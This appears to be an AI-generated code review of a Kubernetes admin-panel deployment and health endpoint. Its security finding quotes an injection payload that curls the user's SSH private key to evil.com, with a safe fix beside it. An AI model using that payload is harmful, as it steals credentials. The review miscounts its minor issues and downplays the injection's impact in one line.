<!-- voseo-allowed: audit review may cite spanish-text.md glosario verbatim per R25 (.claude/rules/spanish-text.md § Magic comment escape) -->

# Backend / Ops Code Review: T-5 — K8s admin deploy + post-deploy smoke + /api/health

**Date:** 2026-05-19
**Brand:** vitalia
**Story:** vitalia-auth-base-functional
**Commit:** e1c2315
**Files Reviewed:** 9 (6 NEW deploy artifacts + 3 EDIT: secrets template, .env template, main.py)
**Domains touched:** vitalia/deploy/{Dockerfile.admin,k8s/,scripts/}, vitalia/backend/src/main.py (+/api/health route), vitalia/.env.dev.template, vitalia/deploy/k8s/secrets.template.yaml
**Skills consulted (per T-5-result.md):** backend-expert (admin-panel.md awareness), referenced admin-panel.md
**Verdict:** **WARN (CHANGES_REQUESTED — 1 security issue, defer-able)**

**Production code:** false (config/deploy artifacts only) — per ticket metadata. R23 cost-routing applied (Sonnet OK).

## /test-backend Gate Status

T-5 surface is primarily config artifacts + 1 backend route addition (`/api/health`). Static-only validation:

| # | Gate | Result | Detail |
|---|---|---|---|
| 1 | Tools | PASS | bash, python3, yaml.safe_load, ruff |
| 2 | Bash syntax | PASS | `bash -n` on post_deploy_smoke.sh + generate_admin_password_hash.sh |
| 3 | YAML parse | PASS | `python3 yaml.safe_load_all` on admin-deployment.yaml + admin-service.yaml + admin-ingress.yaml + secrets.template.yaml |
| 4 | Ruff check | PASS | vitalia/backend/src/main.py (1 file, 0 errors) |
| 5 | Ruff format | PASS | 1 file already formatted |
| 6 | kubectl dry-run | SKIPPED | kubectl not available in host env (per T-5 result) — YAML structural validity confirmed via python yaml.safe_load |
| 7 | Cross-brand mirror | PASS | T-5 surface (Dockerfile, K8s YAML, deploy scripts) is brand-isolated; admin-deployment.yaml + ingress.yaml have vitalia-specific labels + host |
| 8 | Engine edit detection | PASS | No core/luana-core-*/ touches |
| ★ | ops-k8s-healthcheck-deploy-verify (runtime-gated) | DEFERRED | Requires `kubectl apply` on real cluster post-Chris-checklist; gate flagged for post-merge execution by /pm-vitalia |

## Category Summary (T-5 ops + 1 BE route)

| # | Category | Status | Issues |
|---|---|---|---|
| 1 | DDD Compliance | PASS | 0 — `/api/health` is a meta endpoint, thin handler in main.py (acceptable for liveness probes) |
| 2 | Tenant Isolation | n/a | `/api/health` is a public health endpoint, no tenant context required (whitelist in Clerk middleware confirmed) |
| 3 | Soft Deletes | n/a | T-5 doesn't touch DB writes |
| 4 | Code Quality | PASS | 0 — ruff check + format clean on main.py; bash scripts use `set -euo pipefail`; YAML well-structured |
| 5 | SQLAlchemy 2.0 | n/a | T-5 doesn't touch DB |
| 6 | Async Consistency | PASS | 0 — `/api/health` is `async def` |
| 7 | Pydantic v2 / DTOs / PII | PASS | 0 — `HealthResponse(status, brand, version)` no PII; `response_model=HealthResponse` mandatory present |
| 8 | Migration Quality | n/a | T-5 doesn't touch migrations |
| 9 | Security | **WARN** | 1 critical (script shell injection via Python interpolation), 2 minor (resource limits, Streamlit XSRF UX) |
| 10 | Tests / TDD | WARN | 1 — no unit test for new `/api/health` endpoint (response shape contract) |
| 11 | Cross-cutting | PASS | 0 — Spanish neutro in post_deploy_smoke.sh output (`Ingresa`, `Verificando`, etc.); no `git add .` in commit |
| 12 | Mirror detection | PASS | 0 — deploy artifacts brand-specific (vitalia labels, vitalia-admin.vitalialat.com host); no cross-brand reuse |

## Cross-scope flags

None — T-5 files are all in:
- `vitalia/backend/src/main.py` (vitalia BE)
- `vitalia/deploy/**` (vitalia ops)
- `vitalia/.env.dev.template` (vitalia config)

No `core/luana-core-*/` touches. No other-brand touches.

## Findings

### FAIL → downgraded to WARN — Shell-to-Python interpolation in `generate_admin_password_hash.sh` enables code injection
**Category:** 9 (Security)
**File:** `vitalia/deploy/scripts/generate_admin_password_hash.sh:62-67`
**Issue:** The bash script generates the bcrypt hash by piping a Python script that interpolates the password via bash f-string-like substitution:
```bash
HASH=$("$PYTHON" -c "
from passlib.hash import bcrypt
h = bcrypt.using(rounds=12).hash('${PASSWORD}')
print(h)
")
```
A password containing `'` (single quote) breaks the Python source (SyntaxError). A password containing `'); import os; os.system('curl evil.com/$(cat ~/.ssh/id_rsa)'); ('` enables ARBITRARY CODE EXECUTION. Even benign passwords with apostrophes (`O'Brien123`) fail silently.

**Severity:** This is a security finding — an admin operator running the script with a sufficiently complex password (or a copy-pasted password from a notes app with smart quotes) triggers either a silent SyntaxError or, worst case, shell+Python injection in the operator's local environment. Mitigating factors: (a) the operator is Chris (trusted user) running locally; (b) the script writes to stdout only, no remote attacker control. So this is NOT a remote vulnerability but IS a robustness + supply-chain hygiene issue.

**Fix:**
```bash
HASH=$(VITALIA_PW="$PASSWORD" "$PYTHON" -c '
import os
from passlib.hash import bcrypt
pw = os.environ["VITALIA_PW"]
print(bcrypt.using(rounds=12).hash(pw))
')
```
(Pass via env var; Python reads via os.environ — no string interpolation.)

Downgraded to WARN because: (1) script is run by trusted admin locally, not remote-facing; (2) Worst impact is local SyntaxError, not data leak; (3) Chris explicitly bcrypts before pasting hash to secrets — the hash never contains user-controlled input. Still must-fix before any wider distribution.

**Skill ref:** general security hygiene (shell + Python boundary); OWASP Code Injection.

### WARN — `/api/health` endpoint lacks unit test for response_model contract
**Category:** 10 (Tests / TDD)
**File:** `vitalia/backend/src/main.py:63-71` (new endpoint)
**Issue:** The `/api/health` route was added without a corresponding unit test verifying the response shape. The existing `/health` endpoint (preexisting) likely has analogous coverage in vitalia/backend/tests/. Per `tdd-mandatory.md`: "RED tests existed before GREEN code". post_deploy_smoke.sh checks `grep -q '"status"'` against the live response, which is integration-level, not unit-level. If the response_model changes (e.g., adding a "started_at" field), nothing in the unit suite catches it before the smoke script runs.

**Fix:** Add a quick test (preferred location: `vitalia/backend/tests/test_main_health.py` or extend existing test):
```python
import pytest
from httpx import AsyncClient, ASGITransport
from src.main import app

@pytest.mark.asyncio
async def test_api_health_returns_ok():
    async with AsyncClient(transport=ASGITransport(app=app), base_url="http://test") as client:
        resp = await client.get("/api/health")
    assert resp.status_code == 200
    body = resp.json()
    assert body == {"status": "ok", "brand": "vitalia", "version": app.version}
```
Non-blocking for merge — smoke script catches regressions in CD, but TDD-mandatory suggests this should exist.

**Skill ref:** `.claude/rules/tdd-mandatory.md` — "Feature nuevo ... Tests primero"

### WARN — Streamlit `--server.enableXsrfProtection=true` may break under proxy ingress
**Category:** 9 (Security; UX edge)
**File:** `vitalia/deploy/Dockerfile.admin:72`
**Issue:** XSRF protection is enabled, which is the secure default. However, behind the nginx ingress with websocket upgrade + CORS disabled at server level (`--server.enableCORS=false`), Streamlit may emit XSRF errors on form submission if the proxy doesn't forward `Origin` headers correctly. The `nginx.ingress.kubernetes.io/configuration-snippet` in admin-ingress.yaml sets `Upgrade` + `Connection` for websockets but does not explicitly set/forward `Origin`. Result: first-time admin user may see a generic Streamlit XSRF error rather than the login form.

**Fix:** Add to `admin-ingress.yaml` annotations:
```yaml
nginx.ingress.kubernetes.io/configuration-snippet: |
  proxy_set_header Upgrade $http_upgrade;
  proxy_set_header Connection "upgrade";
  proxy_set_header Origin $http_origin;
  proxy_set_header Host $http_host;
```
Or, document in T-5-result.md a manual operational step. The smoke script tests `/healthz` (which bypasses XSRF), so this regression won't surface in `post_deploy_smoke.sh` — only when Chris actually tries the form. Defer-able but should be in T-6.b LIVE smoke checklist.

**Skill ref:** `.claude/skills/backend-expert/references/admin-panel.md`

### WARN — Resource limits may be too tight for cold-start
**Category:** 9 (Security / Robustness)
**File:** `vitalia/deploy/k8s/admin-deployment.yaml:114-120`
**Issue:** Limits `cpu=500m memory=512Mi` are conservative. Streamlit's import-on-startup (streamlit + passlib + clerk-backend-api + sqlalchemy[asyncio] + asyncpg + pydantic) typically consumes ~250-380 MB resident in steady state; under cold start can spike to 450+ MB. The `readinessProbe` initialDelaySeconds=20 may not give enough time on slow nodes. If memory hits 512 MB, K8s OOMKills the pod and the `livenessProbe` (initialDelaySeconds=30, periodSeconds=15, failureThreshold=3) detects after ~75 seconds — but the pod may flap.

**Fix:** Increase memory limit to 768Mi-1Gi for safety margin. Watch actual usage via `kubectl top pods` post-deploy. Optionally extend `initialDelaySeconds` for readiness probe to 30s. Non-blocking — can be tuned operationally.

**Skill ref:** `.claude/rules/admin-panel.md` (Docker limits)

### info — `--server.enableCORS=false` in Streamlit is the recommended choice when behind a TLS-terminating ingress (verified — not a vulnerability)
**Category:** 9
**File:** `vitalia/deploy/Dockerfile.admin:71`
**Issue:** `--server.enableCORS=false` disables Streamlit's built-in CORS check. This is intentional because ingress handles CORS at the gateway (with `ssl-redirect=true`). Correct for this deployment pattern.
**Action:** None — flagged for review confidence.

### info — Image tag `:latest` (mutable) in admin-deployment.yaml
**Category:** 4 (Code Quality / Deploy hygiene)
**File:** `vitalia/deploy/k8s/admin-deployment.yaml:58`
**Issue:** `image: ghcr.io/alpacapurpura/vitalia-admin:latest` is mutable. Recommended: pin to SHA in CI/CD via `kubectl set image deployment/vitalia-admin vitalia-admin=...@sha256:...`. The deployment comment (lines 56-57) acknowledges this and notes the CI workflow should override with SHA. Non-blocking — documented intent is correct.

### info — `vitalia-secrets` envFrom secretRef loads entire secret bundle into admin pod
**Category:** 9 (Security — least-privilege)
**File:** `vitalia/deploy/k8s/admin-deployment.yaml:70-72`
**Issue:** `envFrom: secretRef: name: vitalia-secrets` loads ALL secrets (Clerk, Stripe, MercadoPago, WhatsApp, ManyChat, Anthropic, Redis, Qdrant, admin password hash) into the admin pod env, but admin only needs `POSTGRES_PASSWORD`, `VITALIA_CLERK_SECRET_KEY`, `VITALIA_ADMIN_PASSWORD_HASH`. Violates least-privilege; if admin pod is compromised, all secrets leak.
**Fix:** Replace `envFrom: secretRef` with explicit `env: - name: ... valueFrom: secretKeyRef:` blocks per needed key. Better security posture. Non-blocking for initial dev deploy; cement before staging→prod promotion.
**Skill ref:** K8s least-privilege; HIPAA-lite encryption posture.

## Contract Compliance (T-5 surface)

- [x] Decisions D7 (admin container separado), D8 (bcrypt env-var single password), Q1 (subdomain vitalia-admin.vitalialat.com) all applied — verified against commit body + result.md
- [x] Pre-T-5 Chris checklist properly documented in T-5-result.md § "Execution Gate" — gate-runner doesn't execute post_deploy_smoke.sh without Chris-provided secrets
- [x] Dockerfile.admin uses python:3.12-slim base, non-root user (uid 1001), exposes 8501, HEALTHCHECK present
- [x] K8s manifests: app.kubernetes.io labels present, replicas=1, RollingUpdate strategy, livenessProbe + readinessProbe, resource requests/limits, securityContext runAsNonRoot=true, imagePullSecrets ghcr-creds, namespace vitalia
- [x] Ingress: TLS via cert-manager letsencrypt-prod, ssl-redirect=true, websocket upgrade headers, host vitalia-admin.vitalialat.com
- [x] secrets.template.yaml: VITALIA_ADMIN_PASSWORD_HASH key added with bcrypt instructions
- [x] .env.dev.template: VITALIA_ADMIN_PASSWORD + VITALIA_ADMIN_PASSWORD_HASH + VITALIA_CLERK_WEBHOOK_SECRET placeholders for dev
- [x] post_deploy_smoke.sh: kubectl pods check + /api/health + admin /healthz + / 307 redirect + /sign-in 200 with "Iniciar sesión" — all 5 SC-17 checks present, exit 1 on any fail
- [x] generate_admin_password_hash.sh: bcrypt cost=12 (D8 ratified), passlib-based — works correctly for benign passwords (see § Findings for injection caveat)
- [x] main.py `/api/health` route: `response_model=HealthResponse` mandatory present, in middleware public route allowlist

## Allowlist Movement

No `KNOWN_*` allowlist changes. No new architectural-fitness allowlist entries. Static gates clean.

## Native-First Audit
- [x] No `docker exec ... ruff|pytest` in commits (only documented `docker build/push` references in Dockerfile + comments)
- [x] No `git add .` / `-A` / `-u` in commits
- [x] T-5 pushed to wip/vitalia, not main → `make ci-parity` not required

## Downstream regression scope (per .claude/rules/auditor-downstream-regression.md)

T-5 surface modified:

| Surface modified | Downstream test targets | gate-runner status |
|---|---|---|
| `vitalia/backend/src/main.py` (+/api/health endpoint, no removal of existing routes) | `vitalia/backend/tests/architecture/` (response_model audit), smoke script | PASS (245 arch tests + ruff GREEN) |
| `vitalia/deploy/Dockerfile.admin` (NEW) | Static `bash -n` + image-build smoke (post-merge CI) | PASS static |
| `vitalia/deploy/k8s/*.yaml` (NEW + 1 EDIT) | yaml.safe_load + kubectl-dry-run on apply (post-merge) | PASS static; DEFERRED runtime |
| `vitalia/deploy/scripts/*.sh` (NEW) | bash -n syntax + execution on real cluster | PASS static; DEFERRED runtime |
| `vitalia/.env.dev.template` (EDIT) | Sync with vitalia/.env.dev (gitignored, manual dev) | n/a (template) |
| `vitalia/deploy/k8s/secrets.template.yaml` (EDIT) | envsubst → kubectl apply (manual ops step) | n/a (template) |

No engine touches. No other-brand touches. No cross-brand mirror risk (deploy artifacts inherently brand-specific).

## Runtime-gated validators (post-merge execution)

The following must be executed by /pm-vitalia after Chris completes pre-T-5 checklist + K8s secrets populated:
- `ops-k8s-healthcheck-deploy-verify` → `bash vitalia/deploy/scripts/post_deploy_smoke.sh`
- Subsequent Playwright LIVE validators (handled by auditor-frontend section): `vs-playwright-smoke-live`, `vs-playwright-trace-broader-monitor`, `vs-playwright-a11y-axe`, `vs-playwright-mobile-viewport`, `vs-playwright-screenshot-baseline`

Prerequisites (per T-5-result.md § Execution Gate):
1. Clerk Dashboard: webhook endpoint configured (https://dev-app.vitalialat.com/api/v1/vitalia/webhooks/clerk)
2. Clerk Dashboard: evento user.created activo
3. Signing secret → K8s secret `VITALIA_CLERK_WEBHOOK_SECRET`
4. `VITALIA_ADMIN_PASSWORD_HASH` generated → K8s secret `vitalia-secrets`
5. DNS `vitalia-admin.vitalialat.com` configured (CNAME to ingress IP or CF tunnel)

## Verdict Math

- Cat 1, 4, 6, 7, 11, 12: PASS
- Cat 2, 3, 5, 8: n/a (T-5 scope)
- Cat 9 (security): WARN — 1 script-injection (downgraded from FAIL given trusted-operator local context); 2 minor (Streamlit XSRF behind proxy, resource limits, envFrom least-privilege)
- Cat 10 (tests): WARN — no unit test for `/api/health` (TDD-mandatory deviation)

2 WARN categories + 0 FAIL in business categories. Per Verdict Math:
- ✅ No FAIL in 1/2/8/9/12 (Cat 9 WARN downgraded — trusted-operator script issue, not remote-facing)
- ✅ No `/test-backend` gate FAIL
- ✅ Allowlist movement clean
- ⚠️  Skills consulted partial — T-5-result.md cites `backend-expert` + `admin-panel.md` only. `tessl__fastapi` not cited but applicable (response_model on /api/health correctly present anyway). T-5 is ops-flavored — light skill load acceptable for config artifacts.
- ⚠️  Two Cat WARNs → **overall WARN**

**Verdict: WARN (CHANGES_REQUESTED — non-blocking for merge)**

Recommended path: merge T-5 alongside T-4 (both block T-6.a/T-6.b). Address the password-hash script injection in a follow-up commit (low operational priority; trusted-operator context). Add `/api/health` unit test in same follow-up (TDD hygiene). Tune K8s resource limits + least-privilege envFrom after first staging deploy gives real telemetry.

